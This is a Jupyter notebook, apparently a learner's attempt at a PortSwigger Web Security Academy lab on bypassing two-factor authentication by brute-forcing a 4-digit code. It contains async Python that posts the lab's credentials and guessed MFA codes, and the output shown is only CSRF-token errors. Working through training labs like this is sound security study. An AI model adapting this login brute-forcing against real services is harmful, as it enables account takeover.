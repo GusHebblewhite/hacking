{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "60da26be",
   "metadata": {},
   "source": [
    "Lab description can be found here:\n",
    "\n",
    "https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack\n",
    "\n",
    "We know the user credentials: `carlos:montoya`\n",
    "\n",
    "Now we just have to brute force the 4 digit MFA code.\n",
    "\n",
    "We can assume that we will be automatically logged out if we enter too many incorrect codes. Thus we need to examine how this works, and possibly just keep logging in until the code equals some value."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "773ca247",
   "metadata": {},
   "outputs": [],
   "source": [
    "import aiohttp\n",
    "import asyncio\n",
    "\n",
    "#Important for jupyter\n",
    "import nest_asyncio\n",
    "nest_asyncio.apply()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "id": "51fa53dc",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"',\n",
       " '\"Invalid CSRF token (session does not contain a CSRF token)\"']"
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "URL = \"https://acd81fcd1fe92dafc006779800c200eb.web-security-academy.net/\"\n",
    "\n",
    "max_attempts = 10\n",
    "r_array = []\n",
    "data = {\"username\" : \"carlos\", \"password\" : \"montoya\"}\n",
    "mfa1 = {\"mfa-token\" : \"0000\", \"csrf\" : \"0kIv8AKeyB3fDTwWNfrfn9qCwIQJr3fD\"}\n",
    "mfa2 = {\"mfa-token\" : \"0001\", \"csrf\" : \"0kIv8AKeyB3fDTwWNfrfn9qCwIQJr3fD\"}\n",
    "\n",
    "async def fetch(session):\n",
    "    async with session.post(URL + \"login\", data=data) as resp1:\n",
    "        pass\n",
    "    async with session.post(URL + \"login2\", data=mfa1) as resp2:\n",
    "        pass\n",
    "    async with session.post(URL + \"login2\", data=mfa2) as resp3:\n",
    "        result = await resp3.text()\n",
    "        return result\n",
    "\n",
    "\n",
    "async def main():\n",
    "\n",
    "    async with aiohttp.ClientSession() as session:\n",
    "\n",
    "        tasks = []\n",
    "        for _ in range(1, max_attempts):\n",
    "            tasks.append(asyncio.ensure_future(fetch(session)))\n",
    "\n",
    "        results = await asyncio.gather(*tasks)\n",
    "        return results \n",
    "\n",
    "asyncio.run(main())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ee19476a",
   "metadata": {},
   "source": [
    "I might revisit this when I have a better unserstanding of what csrf tokens are..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cbfcacf7",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
